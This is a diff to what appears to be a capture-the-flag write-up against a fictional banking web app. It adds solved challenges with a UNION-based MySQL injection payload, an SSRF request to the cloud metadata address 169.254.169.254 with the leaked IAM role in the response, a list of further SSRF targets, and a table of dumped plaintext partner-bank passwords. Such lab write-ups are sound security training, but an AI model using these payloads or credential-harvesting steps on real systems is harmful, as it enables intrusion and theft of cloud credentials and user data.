@@ -33,10 +33,12 @@
 
 | Ask a Crooked Question | Alpaca | 340 | SQLi on oracle search → `oracle_service_secrets` table → `search_flag = 383342zBE-56aT13f3625` → submitted to crwd-ctrl |
 | Trust Issues | Octopus | 300 | SSRF via `GET /api/cards/1/reward-points?rewardServiceUrl=http://localhost/internal/files/reward_client.json` → flag `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS` |
+| Loaded Questions | Hippo | 100 | SQLi on `GET /api/manual-links/connector?connectorId='` → MySQL 8.4.11, 3 columns; `GROUP_CONCAT(table_name)` dumps partner DB tables |
+| Overreach | Hippo | 250 | SSRF via `POST /api/partner-banks/{id}/discover` to `169.254.169.254` → flag `B3D3C2zAD-254T609`; submitted to crwd-ctrl |
 | Speak as the Oracle | Octopus | 200 | Broken auth on `POST /api/oracle/markets/{id}/settle` — no seer token required; settle via UI "Consult the Oracle" button |
 | A Verdict Never Spoken | Octopus | 400 | Settled an OPEN/unresolved market via `POST /api/oracle/markets/{id}/settle` before its natural close |
 
-**Total earned: 4160 pts**
+**Total earned: 4510 pts**
 
 ---
 
@@ -76,6 +78,24 @@
   3. Use leaked path: `rewardServiceUrl=http://localhost/internal/files/reward_client.json` → 200 `{"flag":"DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS"}`
 - **Flag:** `DMP_FLAG_SSRF_INTERNAL_FILE_ACCESS`
 - **Submission:** CHALLENGE_KEY form on crwd-ctrl
+
+### Loaded Questions — 100 pts ✅
+- **Vulnerability:** SQLi on `GET /api/manual-links/connector?connectorId=` (MySQL backend)
+- **Exact request:** `GET /api/manual-links/connector?connectorId='` → 400 with MySQL syntax error
+- **Exploit:** `xxx' UNION SELECT GROUP_CONCAT(table_name SEPARATOR ','),'x','x' FROM information_schema.tables WHERE table_schema=database()-- -`
+- **DB:** MySQL 8.4.11, database `darkmoney_partners`
+- **Tables found:** `partner_bank`, `partner_bank_account`, `partner_bank_user`
+- **Data dumped:** Partner bank user credentials + all 7 partner bank codes + account data
+- **Partner users:** atlantis.customer, gross.notional, konza.member, fu.exchange, sovereign.holder, gilded.trust, sylvan.member, atlantis.h1pp0
+- **Submission:** Auto-detected via SQLi error, then data exfil
+
+### Overreach — 250 pts ✅
+- **Vulnerability:** SSRF via `POST /api/partner-banks/{id}/discover` with `{discoveryHost: "HOST"}`
+- **Exact request:** `POST /api/partner-banks/1/discover` with `{"discoveryHost":"169.254.169.254"}`
+- **Response:** `{"status":"UNVERIFIED","discoveryDocument":{"instance-id":"i-0f2a9c4b7e13d8506","iam":{"info":{"InstanceProfileArn":"arn:aws:iam::481563927104:instance-profile/darkmoney-linking-role"}},...},"flag":"B3D3C2zAD-254T609"}`
+- **Other SSRF targets found:** `dmlink-config.internal` (→ link_signing_key), `198.51.100.66:8443` (Sylvan bank IP, REACHABLE), `link.sovereign-union.invalid` (REACHABLE)
+- **Flag:** `B3D3C2zAD-254T609`
+- **Submission:** Manual SUBMIT form on crwd-ctrl
 
 ### Speak as the Oracle — 200 pts ✅
 - **Vulnerability:** Broken authorization — `POST /api/oracle/markets/{id}/settle` has no seer token check
@@ -241,10 +261,25 @@ fetch('/api/auth/login', {method:'POST', credentials:'include', headers:{'Conten
 | 9 | ? | ? | DMACCEXT0001-0007 | External/shadow accounts |
 
 ## Partner Bank Codes
-- `DM-ATL-0042` — Bank of Atlantis
-- `DM-GRO-0117` — Groß Notional Bank
-- `DM-TGK-0298` — Tallgrass Konza Bank
-- `DM-FUE-0531` — Font & Underwood Exchange
+- `DM-ATL-0042` — Bank of Atlantis (api.bankofatlantis.example)
+- `DM-GRO-0117` — Groß Notional Bank (api.gross-notional.example.net)
+- `DM-TGK-0298` — Tallgrass Konza Bank (api.tallgrasskonza.test)
+- `DM-FUE-0531` — Font & Underwood Exchange (underwood-exchange.example)
+- `DM-SUD-0719` — Sovereign Union Deposit Obligations (link.sovereign-union.invalid) **REACHABLE via SSRF**
+- `DM-GRF-0824` — Gilded Reserve And Financial Trust (gilded-reserve.example.com)
+- `DM-SYL-0066` — Sylvan Community & Mutual Credit Union (198.51.100.66:8443) **REACHABLE via SSRF, real IP**
+
+## Partner Bank User Credentials (from MySQL SQLi)
+| Username | Password | Bank |
+|----------|----------|------|
+| atlantis.customer | Tr1ton&Reef2026 | Bank of Atlantis |
+| gross.notional | Pr3z1si0n#GN26 | Groß Notional Bank |
+| konza.member | Pra1ri3$Konza7 | Tallgrass Konza Bank |
+| fu.exchange | W1re&Underw00d8 | Font & Underwood Exchange |
+| sovereign.holder | D1scr33t$SUD19 | Sovereign Union |
+| gilded.trust | G0ld3n@Reserve4 | Gilded Reserve |
+| sylvan.member | C0mmun1ty&Sylv0 | Sylvan Community |
+| atlantis.h1pp0 | 7e3023bfc3bb1666fe3a0e76 | Bank of Atlantis (hex token?) |
 
 ## Tech Stack
 - Frontend: React/Vite SPA
